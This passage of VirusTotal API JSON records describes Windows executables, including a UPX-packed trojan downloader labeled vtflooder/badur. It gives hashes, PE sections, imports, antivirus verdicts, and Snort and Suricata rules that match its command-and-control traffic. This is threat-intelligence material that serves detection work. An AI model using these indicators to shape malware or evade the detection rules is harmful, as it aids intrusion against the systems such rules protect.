            "sha256": "41f05a4df5f42d92b879493d51941de342d36460fe15c0f3b63b2b706b928fef",
            "type": "RT_BITMAP"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "81265e63c89ee5c2e5126452e22f84e9be9452449f3e5959ab6d346cb58b2bde",
            "type": "RT_BITMAP"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "6b97877cdd547e6ba6467f86055f1fc7b06660b034439f0da4c137538ef14a83",
            "type": "RT_BITMAP"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "c925e4a8cbf6d42dbb1220a510614df725558f8d843338982bab8c4e020f6429",
            "type": "RT_BITMAP"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "6b97877cdd547e6ba6467f86055f1fc7b06660b034439f0da4c137538ef14a83",
            "type": "RT_BITMAP"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "78507a772de646626b196a743cee75b298a68c33a0fd482842071519d59037b2",
            "type": "RT_BITMAP"
          },
          {
            "lang": "RUSSIAN",
            "filetype": "data",
            "sha256": "ce7ea3df79d30cc4cdb2d2fe65f63816d1100ba107f88c513d83d9a5840f19dd",
            "type": "RT_ICON"
          },
          {
            "lang": "RUSSIAN",
            "filetype": "data",
            "sha256": "75b17f40de675faee28e04142a3a92f3a7ac7cc11e588a9584db767c79a66177",
            "type": "RT_ICON"
          },
          {
            "lang": "RUSSIAN",
            "filetype": "data",
            "sha256": "fdd2fe9e99571cb3785ad286bbad94a63d06c2c356584e0b5f1ca69ab07ff6a9",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "771f64afb45a9edc8c4f6c5b2039f9b32623cea53bf0cab5bf1f371cc5d1abe4",
            "type": "RT_DIALOG"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "019564d232f633b2ccb22c08cd62ae1d4fb8dbde4a055a766c00dd39bbdfd526",
            "type": "RT_DIALOG"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "24786dd0a51b3e08353719208c332e0e51e4b9211649dac9be595f1ed9d669ed",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "c6449153d2934c1805afa35e42ce35f3f4874caf9c71fd34e9acb615753f2990",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "53a30e50499c991d753a3b6565dc371fdbc5128b75f1357486fc130905bb216b",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "34e0a6da38a141d966411be54a1237f7e970ceab2ed1d675f7b5bb9976b1128d",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "97b8b92270f47e8b03c31c594b24199cddad98c50538a545afb2b4ae22f89092",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "0cf000f5b0587558eb8f629afa5fe52335b56b46683270fbd9f899f4c1fe046a",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "54809350329257a2640de252e15dafe1231960b9657e760cd30e74baeb10bc20",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "419fc87b1f010a79bc7349417ac894f0c5bf82099d5ce7d411f5499d506a9e47",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "4954b5cda77a9401a3e9f847f402959c4c9feff1a2c485b0f2cdf67b854fc56c",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "5aed78249a7f3e9ed401191e29905c457157df452b16af4b8e997dc29bc18362",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "b79a9daadeee5d664926fdd77b32958cc25735f6fe1efa90635cfdf7cdcb421b",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "5c3a742bf7deb8902ea07b5f0da07f2e8053d9e7dadcadc16662489711d422bd",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "0efc89afa7df121e9c860cf9005edd1412de242f4eafbb334a30a0495483b781",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "47b2d9fe86d6a105a4653e8e1cd95bcd0543ca0f807f06906b23a799535457cc",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "0454daf100854e80e714cd723e59ab4c16c05b95123d7a05a6a0c6fbb118d91e",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "b3635c3cc30eaa1d848ce01e504bef29f51feda580feec945b319906bfe35e32",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "7989e502312cfb848601811fd607df5aa3a23fe8b28a25d42938bcb93fefb499",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "19c0ee380ecf5900102d22103000770990a0d26f1eca530d38e4f9a592ebe643",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "29458473ee04f6903d432f1a7150b2bf667568d836172c693823d4582532fbd5",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "1ad7d9b67c9f04c569438fe1334e08770b3c3fd17c24d0816d463f37d2323747",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "215ae2c5e020b1b082138b4353e82fc0cf6e2fd417fa260652c3d91f5459c036",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "af5a020a1e7d1d171a4e9b7681e80177f9d66d88173a3d3143db660214fe82e9",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "ba0959a085bb214df16b856d62b7734688a0dc17568981c692409eb2cf5fc450",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "20a88211d2706ccaafc049ace2750e0072e3755cc9c56f7517291a9a83eb1c7d",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "1eddbe329d5339582536f7dd2b5d8553b46f7c39611c11076e94e5b954377c4a",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "6b60c05a1b9aaf3c75976dd4a0477079489186f3306c78cef44ea2d1bea1661a",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "2d5c6cdc8b9f7e1a6f5035d6e5cff45e3da67669e3ea78a315b30d04bfa4e6d9",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "ccd45b142863cf77515b3deb339809e904d8e48a78773fc39864f6e1ab11d0e0",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "ASCII text",
            "sha256": "92ede41d77603242ecfb99567b1b174c3e75a2e6c88971d2cb0f632672e11c09",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH US",
            "filetype": "data",
            "sha256": "677245e2a6b2eb5495b4965b8c26025a4b26e8b8c21a825f658cb390b493b9a0",
            "type": "RT_RCDATA"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "88d14cc6638af8a0836f6d868dfab60df92907a2d7becaefbbd7e007acb75610",
            "type": "RT_RCDATA"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "e3278d7c3fec194c69d9c4379fa0332362d1c602287776509b950399850c01ad",
            "type": "RT_RCDATA"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "dde638d182e183f150a429212b5032d7463376ea11f9e26d9710fcb7cbf45078",
            "type": "RT_RCDATA"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "564df347cdbdd24bbc3c4526af6d1a30998e2ceed4889af88283bbf26271c3d5",
            "type": "RT_RCDATA"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "data",
            "sha256": "8bac25105a3df58a5dd4d5f050d7e4af467e0a8ae3dd84fe4fb0396f72487e84",
            "type": "RT_RCDATA"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "Lotus 1-2-3",
            "sha256": "c53efa8085835ba129c1909beaff8a67b45f50837707f22dfff0f24d8cd26710",
            "type": "RT_GROUP_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "Lotus 1-2-3",
            "sha256": "b07e022f8ef0a8e5fd3f56986b2e5bf06df07054e9ea9177996b0a6c27d74d7c",
            "type": "RT_GROUP_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "Lotus 1-2-3",
            "sha256": "43f40dd5140804309a4c901ec3c85b54481316e67a6fe18beb9d5c0ce3a42c3a",
            "type": "RT_GROUP_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "Lotus 1-2-3",
            "sha256": "ff47a48c11c234903a7d625cb8b62101909f735ad84266c98dd4834549452c39",
            "type": "RT_GROUP_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "Lotus 1-2-3",
            "sha256": "a0adcedb82b57089f64e2857f97cefd6cf25f4d27eefc6648bda83fd5fef66bb",
            "type": "RT_GROUP_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "Lotus 1-2-3",
            "sha256": "6e1e7738a1b6373d8829f817915822ef415a1727bb5bb7cfe809e31b3c143ac5",
            "type": "RT_GROUP_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "filetype": "Lotus 1-2-3",
            "sha256": "326c048595bbc72e3f989cb3b95fbf09dc83739ced3cb13eb6f03336f95d74f1",
            "type": "RT_GROUP_CURSOR"
          },
          {
            "lang": "RUSSIAN",
            "filetype": "data",
            "sha256": "77a1efb6136f52dd2372987b13bf486aa75baeacb93bad009aa3e284c57b8694",
            "type": "RT_GROUP_ICON"
          },
          {
            "lang": "SWEDISH",
            "filetype": "data",
            "sha256": "3c6b2547bcee09d07c53ad44c9a61be44fc2f617de93cd0e4f4d72c120ec29e0",
            "type": "RT_VERSION"
          },
          {
            "lang": "ENGLISH US",
            "filetype": "ASCII text",
            "sha256": "389c2307d892a611d03560b956d3ebb1e1b19d785faf6b13579dba5c67b5aecd",
            "type": "RT_MANIFEST"
          }
        ],
        "resource_types": {
          "RT_DIALOG": 2,
          "RT_GROUP_CURSOR": 7,
          "RT_ICON": 3,
          "RT_MANIFEST": 1,
          "RT_STRING": 29,
          "AVI": 1,
          "RT_RCDATA": 6,
          "RT_BITMAP": 11,
          "RT_CURSOR": 7,
          "RT_VERSION": 1,
          "RT_GROUP_ICON": 1
        },
        "imphash": "7e55c61f2a3d88bdf4acbb42f6065c53",
        "overlay": {
          "size": 12416,
          "filetype": "data",
          "offset": 1238016,
          "entropy": 6.124572257631954,
          "md5": "b25a918ea6e099ab590b9c8e6af39ce1"
        },
        "resource_langs": {
          "RUSSIAN": 4,
          "SWEDISH": 1,
          "NEUTRAL": 62,
          "ENGLISH US": 2
        },
        "machine_type": 332,
        "timestamp": 708992537,
        "entry_point": 1002107,
        "sections": [
          {
            "virtual_size": 664004,
            "entropy": 6.55,
            "name": "CODE",
            "raw_size": 664064,
            "virtual_address": 4096,
            "md5": "372a7dc55db4a16328510414033bfb1b"
          },
          {
            "virtual_size": 17096,
            "entropy": 4.72,
            "name": "DATA",
            "raw_size": 17408,
            "virtual_address": 671744,
            "md5": "4a0bde9ed527ce8fdf3036d7c5038c8d"
          },
          {
            "virtual_size": 5349,
            "entropy": 0,
            "name": "BSS",
            "raw_size": 0,
            "virtual_address": 692224,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "virtual_size": 9306,
            "entropy": 7.77,
            "name": ".idata",
            "raw_size": 9728,
            "virtual_address": 700416,
            "md5": "e6f0d21efae3437d2e6dd2054b741d2d"
          },
          {
            "virtual_size": 28,
            "entropy": 0,
            "name": ".tls",
            "raw_size": 0,
            "virtual_address": 712704,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "virtual_size": 24,
            "entropy": 0.2,
            "name": ".rdata",
            "raw_size": 512,
            "virtual_address": 716800,
            "md5": "6ac7f99dccddfe221acf8ce55b1674df"
          },
          {
            "virtual_size": 246367,
            "entropy": 7.06,
            "name": ".text",
            "raw_size": 246784,
            "virtual_address": 720896,
            "md5": "e310e5c3ea0c0d6aedf7a34ea7dc7322"
          },
          {
            "virtual_size": 121452,
            "entropy": 7.83,
            "name": ".itext",
            "raw_size": 121856,
            "virtual_address": 970752,
            "md5": "6304c2c9ae33ebcdf2d09c8e09eb82d3"
          },
          {
            "virtual_size": 56200,
            "entropy": 6.68,
            "name": ".reloc",
            "raw_size": 56320,
            "virtual_address": 1093632,
            "md5": "db948cbbbb8474ef816995580142fc2c"
          },
          {
            "virtual_size": 120239,
            "entropy": 4.79,
            "name": ".rsrc",
            "raw_size": 120320,
            "virtual_address": 1150976,
            "md5": "65bae1281174ac68eebb129b3b9b293e"
          }
        ],
        "import_list": [
          {
            "library_name": "comdlg32.dll",
            "imported_functions": [
              "GetSaveFileNameA"
            ]
          },
          {
            "library_name": "version.dll",
            "imported_functions": [
              "VerQueryValueA"
            ]
          },
          {
            "library_name": "gdi32.dll",
            "imported_functions": [
              "CreatePalette"
            ]
          },
          {
            "library_name": "shell32.dll",
            "imported_functions": [
              "ShellExecuteA"
            ]
          },
          {
            "library_name": "kernel32.dll",
            "imported_functions": [
              "DeleteCriticalSection",
              "GetModuleFileNameA",
              "LocalAlloc",
              "GetModuleHandleA",
              "GetModuleFileNameW",
              "LocalFree",
              "ExitProcess",
              "GetVersionExA",
              "GetVersion",
              "LoadLibraryA"
            ]
          },
          {
            "library_name": "oleaut32.dll",
            "imported_functions": [
              "VariantCopy"
            ]
          },
          {
            "library_name": "advapi32.dll",
            "imported_functions": [
              "RegOpenKeyExA"
            ]
          },
          {
            "library_name": "ole32.dll",
            "imported_functions": [
              "CoUninitialize"
            ]
          },
          {
            "library_name": "shlwapi.dll",
            "imported_functions": [
              "StrStrIA"
            ]
          },
          {
            "library_name": "user32.dll",
            "imported_functions": [
              "SetActiveWindow"
            ]
          },
          {
            "library_name": "comctl32.dll",
            "imported_functions": [
              "ImageList_GetBkColor"
            ]
          }
        ]
      },
      "magic": "PE32 executable for MS Windows (GUI) Intel 80386 32-bit",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 0,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 24,
        "undetected": 28
      },
      "meaningful_name": "egui.exe",
      "reputation": 0
    },
    "type": "file",
    "id": "218ed0de3279c5f215fd1ff221e6cf5a4ab6558c1d913769ccd4759f3338f539",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/218ed0de3279c5f215fd1ff221e6cf5a4ab6558c1d913769ccd4759f3338f539"
    }
  }
},
{
  "_id": {
    "$oid": "65b503c384fadeb949ecf6fa"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T17BB1398BFEBE6E86C4C149332BA3458D62EE14FC4B5ACB801A6C190A34B7F4C0671D15",
      "vhash": "05303e0f7d1bz63z11z19z11z1fz",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "creation_date": 1406163005,
      "names": [
        "1.exe"
      ],
      "last_modification_date": 1669928551,
      "type_tag": "peexe",
      "times_submitted": 19,
      "total_votes": {
        "harmless": 1,
        "malicious": 0
      },
      "size": 5120,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.vtflooder/badur",
        "popular_threat_category": [
          {
            "count": 39,
            "value": "trojan"
          },
          {
            "count": 4,
            "value": "downloader"
          }
        ],
        "popular_threat_name": [
          {
            "count": 7,
            "value": "vtflooder"
          },
          {
            "count": 3,
            "value": "badur"
          },
          {
            "count": 3,
            "value": "vflooder"
          }
        ]
      },
      "authentihash": "c4c67cbddc416f9bbfced08d80f65992f64dc7fa3eff04eb0da6efd3e25de6d0",
      "last_submission_date": 1533251348,
      "meaningful_name": "1.exe",
      "crowdsourced_ids_stats": {
        "info": 0,
        "high": 2,
        "medium": 0,
        "low": 4
      },
      "trid": [
        {
          "file_type": "UPX compressed Win32 Executable",
          "probability": 35.7
        },
        {
          "file_type": "Win32 EXE Yoda's Crypter",
          "probability": 35
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 8.6
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 6.6
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 5.9
        }
      ],
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "harmless",
          "confidence": 1,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "CLEAN"
          ]
        },
        "Tencent HABO": {
          "category": "malicious",
          "sandbox_name": "Tencent HABO",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "000033234c05472f5bc4a198c90944c052e704f35081358bfe0d631a76d5a4e5",
      "type_extension": "exe",
      "tags": [
        "peexe",
        "spreader",
        "upx",
        "direct-cpu-clock-access",
        "long-sleeps",
        "runtime-modules"
      ],
      "crowdsourced_ids_results": [
        {
          "rule_category": "trojan-activity",
          "alert_severity": "high",
          "rule_msg": "MALWARE-CNC Win.Trojan.Occamy variant outbound connection",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS ( msg:\"MALWARE-CNC Win.Trojan.Occamy variant outbound connection\"; flow:to_server,established; http_client_body; content:\"03488030fb57e825ca7f652571f12f15dbb069220773190978b85793c9ecfead\",fast_pattern,nocase; metadata:impact_flag red,policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; service:http; reference:url,www.virustotal.com/#/file/A25F83694449EB297D91D5059954FA1EBE98BABDFAC2E98B76FD1F695AE44964/analysis; classtype:trojan-activity; sid:48083; rev:1; )",
          "alert_context": [
            {
              "dest_ip": "74.125.34.46",
              "dest_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://www.virustotal.com/#/file/A25F83694449EB297D91D5059954FA1EBE98BABDFAC2E98B76FD1F695AE44964/analysis"
          ],
          "rule_id": "1:48083"
        },
        {
          "rule_category": "trojan-activity",
          "alert_severity": "high",
          "rule_msg": "MALWARE-CNC Win.Trojan.Occamy variant outbound connection",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS ( msg:\"MALWARE-CNC Win.Trojan.Occamy variant outbound connection\"; flow:to_server,established; http_uri; content:\"/pidoras6\",fast_pattern,nocase; http_header; content:\"User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388\"; metadata:impact_flag red,policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; service:http; reference:url,www.virustotal.com/#/file/A25F83694449EB297D91D5059954FA1EBE98BABDFAC2E98B76FD1F695AE44964/analysis; classtype:trojan-activity; sid:48084; rev:1; )",
          "alert_context": [
            {
              "dest_ip": "104.244.42.65",
              "dest_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://www.virustotal.com/#/file/A25F83694449EB297D91D5059954FA1EBE98BABDFAC2E98B76FD1F695AE44964/analysis"
          ],
          "rule_id": "1:48084"
        },
        {
          "rule_category": "unknown",
          "alert_severity": "low",
          "rule_msg": "(http_inspect) HTTP Content-Length message body was truncated",
          "rule_raw": "alert ( gid:119; sid:260; rev:1; msg:\"(http_inspect) HTTP Content-Length message body was truncated\"; metadata: rule-type preproc; classtype:unknown;)",
          "alert_context": [
            {
              "dest_ip": "74.125.34.46",
              "dest_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "119:260"
        },
        {
          "rule_category": "Misc activity",
          "alert_severity": "low",
          "rule_msg": "ET INFO Generic HTTP EXE Upload Outbound",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET INFO Generic HTTP EXE Upload Outbound\"; flow:established,to_server; http.method; content:\"POST\"; nocase; http.request_body; content:\"MZ\"; content:\"|00 00 00 00|\"; distance:0; content:\"PE|00 00|\"; fast_pattern; distance:0; classtype:misc-activity; sid:2016775; rev:3; metadata:created_at 2013_04_19, updated_at 2020_04_23;)",
          "alert_context": [
            {
              "url": "http://www.virustotal.com/vtapi/v2/file/scan",
              "hostname": "www.virustotal.com",
              "dest_ip": "74.125.34.46",
              "dest_port": 80
            },
            {
              "url": "http://www.virustotal.com/vtapi/v2/file/scan",
              "hostname": "www.virustotal.com",
              "dest_ip": "74.125.34.46",
              "dest_port": 80
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2016775"
        },
        {
          "rule_category": "Unknown Traffic",
          "alert_severity": "low",
          "rule_msg": "ET JA3 Hash - Possible Malware - Various Malfams",
          "rule_raw": "alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET JA3 Hash - Possible Malware - Various Malfams\"; ja3_hash; content:\"bafc6b01eae6f4350f5db6805ace208e\"; reference:url,github.com/trisulnsm/trisul-scripts/blob/master/lua/frontend_scripts/reassembly/ja3/prints/ja3fingerprint.json; reference:url,www.malware-traffic-analysis.net; classtype:unknown; sid:2028388; rev:2; metadata:created_at 2019_09_10, former_category JA3, updated_at 2019_10_29;)",
          "alert_context": [
            {
              "dest_ip": "104.244.42.65",
              "ja3": [
                "bafc6b01eae6f4350f5db6805ace208e"
              ],
              "dest_port": 443
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://github.com/trisulnsm/trisul-scripts/blob/master/lua/frontend_scripts/reassembly/ja3/prints/ja3fingerprint.json",
            "https://www.malware-traffic-analysis.net"
          ],
          "rule_id": "1:2028388"
        },
        {
          "rule_category": "Generic Protocol Command Decode",
          "alert_severity": "low",
          "rule_msg": "SURICATA HTTP too many warnings",
          "rule_raw": "alert http any any -> any any (msg:\"SURICATA HTTP too many warnings\"; flow:established; app-layer-event:http.too_many_warnings; flowint:http.anomaly.count,+,1; classtype:protocol-command-decode; sid:2221050; rev:1;)",
          "alert_context": [
            {
              "url": "http://www.virustotal.com/vtapi/v2/file/scan",
              "hostname": "www.virustotal.com",
              "dest_ip": "74.125.34.46",
              "dest_port": 80
            }
          ],
          "rule_url": "https://www.openinfosecfoundation.org/",
          "rule_source": "Suricata",
          "rule_id": "1:2221050"
        }
      ],
      "last_analysis_date": 1654051509,
      "unique_sources": 1,
      "first_submission_date": 1532461201,
      "sha1": "c4056a793fcccbcf686b74176ef989707b528be8",
      "ssdeep": "96:Gv110GxW2FjJYPmVI+V9IGjSJGs+K1C+Rv2aKb43dkU:Gv110GPdYPmVI+UGj8C+RPj3dkU",
      "packers": {
        "PEiD": "UPX v0.89.6 - v1.02 / v1.05 -v1.24 -> Markus & Laszlo [overlay]",
        "F-PROT": "UPX"
      },
      "md5": "eaa742310f9713a66bf20adae8da6eee",
      "pe_info": {
        "rich_pe_header_hash": "4b2abda1a68cb40afa72a6f4d807601f",
        "timestamp": 1406163005,
        "compiler_product_versions": [
          "[---] Unmarked objects (old) count=5",
          "[IMP] VS2008 SP1 build 30729 count=11",
          "[---] Unmarked objects count=27",
          "[C++] VS2010 SP1 build 40219 count=3",
          "[LNK] VS2010 SP1 build 40219 count=1"
        ],
        "entry_point": 31472,
        "machine_type": 332,
        "imphash": "8c9bb9d690553503983713582e1e58f7",
        "sections": [
          {
            "name": "UPX0",
            "chi2": -1,
            "virtual_address": 4096,
            "entropy": 0,
            "raw_size": 0,
            "flags": "rwx",
            "virtual_size": 24576,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": "UPX1",
            "chi2": 17422.15,
            "virtual_address": 28672,
            "entropy": 7.22,
            "raw_size": 3584,
            "flags": "rwx",
            "virtual_size": 4096,
            "md5": "59cc2f79c0edc80fdee4e9ff23e3fad8"
          },
          {
            "name": "UPX2",
            "chi2": 38855,
            "virtual_address": 32768,
            "entropy": 3.42,
            "raw_size": 512,
            "flags": "rw",
            "virtual_size": 4096,
            "md5": "20e8f5bcd09c9c7007021ab464661cf1"
          }
        ],
        "import_list": [
          {
            "library_name": "KERNEL32.DLL",
            "imported_functions": [
              "ExitProcess",
              "GetProcAddress",
              "LoadLibraryA",
              "VirtualAlloc",
              "VirtualFree",
              "VirtualProtect"
            ]
          },
          {
            "library_name": "ntdll.dll",
            "imported_functions": [
              "_wtoi"
            ]
          },
          {
            "library_name": "ole32.dll",
            "imported_functions": [
              "CreateStreamOnHGlobal"
            ]
          },
          {
            "library_name": "SHLWAPI.dll",
            "imported_functions": [
              "StrStrA"
            ]
          },
          {
            "library_name": "USER32.dll",
            "imported_functions": [
              "wsprintfA"
            ]
          },
          {
            "library_name": "WINHTTP.dll",
            "imported_functions": [
              "WinHttpOpen"
            ]
          }
        ]
      },
      "magic": "PE32 executable for MS Windows (GUI) Intel 80386 32-bit",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 61,
        "undetected": 7
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "1.3.0.9899",
          "result": "W32.AIDetect.malware1",
          "method": "blacklist",
          "engine_update": "20220530"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.37",
          "result": "malicious (moderate confidence)",
          "method": "blacklist",
          "engine_update": "20220520"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "0.105.0.0",
          "result": "Win.Malware.Vtflooder-6722904-1",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.10.2019.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20211026"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "14.00",
          "result": "Trojan.Mauvaise.SL1",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Generic-FAVK!EAA742310F97",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.3.3.37",
          "result": "Upatre.Trojan.Downloader.DDS",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.14.0.0",
          "result": "Trojan.Win32.Save.a",
          "method": "blacklist",
          "engine_update": "20220520"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.16.42612",
          "result": "Trojan ( 0040f9251 )",
          "method": "blacklist",
          "engine_update": "20220601"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "Trojan:Win32/Vtflooder.492",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.16.42610",
          "result": "Trojan ( 0040f9251 )",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (D)",
          "method": "blacklist",
          "engine_update": "20220418"
        },
        "Baidu": {
          "category": "malicious",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": "Win32.Trojan-Downloader.Tiny.c",
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.207",
          "result": "Trojan.Win32.Clicker.BGOU",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "Cyren": {
          "category": "malicious",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": "W32/Trojan2.QIPZ",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220208"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.17.0.0",
          "result": "Downloader.Upatre",
          "method": "blacklist",
          "engine_update": "20220531"
        },
        "tehtris": {
          "category": "malicious",
          "engine_name": "tehtris",
          "engine_version": "v0.1.2",
          "result": "Generic.Malware",
          "method": "blacklist",
          "engine_update": "20220601"
        },
